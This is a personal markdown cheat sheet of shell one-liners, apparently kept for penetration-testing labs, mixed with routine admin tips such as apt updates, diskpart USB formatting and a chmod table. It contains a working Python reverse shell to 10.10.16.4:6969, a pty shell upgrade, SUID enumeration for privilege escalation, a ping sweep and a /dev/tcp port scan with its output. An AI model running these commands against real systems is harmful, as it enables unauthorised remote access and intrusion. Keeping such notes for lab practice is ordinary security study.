## Table of Contents

- [python/pypy stuff](#python/pypy\stuff)
      - [How can I format USB drive in CMD?](#How\can\I\format\USB\drive\in\CMD?)
- [Linux Enumeration for SUID Binaries](#linux\enumeration\for\suid\binaries)
  - [Start/Stop Docker Service](#Start/Stop\Docker\Service)

 ### One liners


# python/pypy stuff
**Python Reverse shell One liner**
`\python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.4",6969));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")\`

**python shell upgrade**
`\python3 -c 'import pty;pty.spawn("/bin/bash")'\`


**Find all binary files that are own/Ran under a different user with execute permissions:**
`\find / -type[f,b,d] ! -user $(whoami) -perm /u=x\`


**Kill OpenVPN**
`sudo kill -9 $(ps aux | grep openvpn | grep -v grep | awk '{print $2}')`

**Retrieve all users on a windows machine using PowerShell**
`Get-WmiObject -Class Win32_UserAccount -Filter "LocalAccount=True"`


**Fully update Linux/Kali Linux machiness**
`sudo apt-get update && sudo apt upgrade -y && sudo apt dist-upgrade && sudo apt autoremove`

**Windows PowerShell command to retrieve info about a file, below gets size (in bytes) of a .exe**

`$file = Get-Item "path_to_your_file.exe"
`$file.Length

**Download an entire website**
```shell
wget --random-wait -r -p -e robots=off -U mozilla http://example.com
```


**URL Decoding** 
```shell
 -e's/%\([0-9A-F][0-9A-F]\)/\\\\\x\1/g' |  [xargs] echo -e

```


#### How can I format USB drive in CMD?
You can press Windows + R, type cmd, and press Ctrl + Shift + Enter to run Command Prompt as administrator. Then type the following commands and press Enter after each command.
- diskpart
- list disk
- select disk * (replace * with the exact disk number of USB)
- clean
- format fs=fat32 quick (replace fat32 with ntfs if you want to format USB to ntfs format)
- assign letter=* (replace * with preferred drive letter)
- exit

**Chmod Numbers**
Number | Permissions | Totals
-------------------------------------------------
```bash
0 | --- | 0+0+0
1 | --x | 0+0+1
2 | -w- | 0+2+0
3 | -wx | 0+2+1
4 | r-- | 4+0+0
5 | r-x | 4+0+1
6 | rw- | 4+2+0
7 | rwx | 4+2+1 
```
#linuxepermissionstable
**Ping Sweep Example**
```shell
for i in {1..254}; do (ping -c 1 172.19.0.${i} | grep "bytes from" | grep -v "Unreachable" &); done;
```
#pingsweep
It’s a safe guess that .1 is the Docker host.

A quick port scan shows it’s listening on 22 and 80:

```shell
root@3a453ab39d3d:~ for port in {1..65535}; do echo > /dev/tcp/172.19.0.1/$port && echo "$port open"; done 2>/dev/null           
22 open
80 open
```

# Linux Enumeration for SUID Binaries
```shell
find / -perm -4000 2>/dev/null
```
#LInux #enumeration #suid #find #binaries #privesc 

## Start/Stop Docker Service
```shell
sudo systemctl stop docker
Activate with: docker.socket
```
#docker










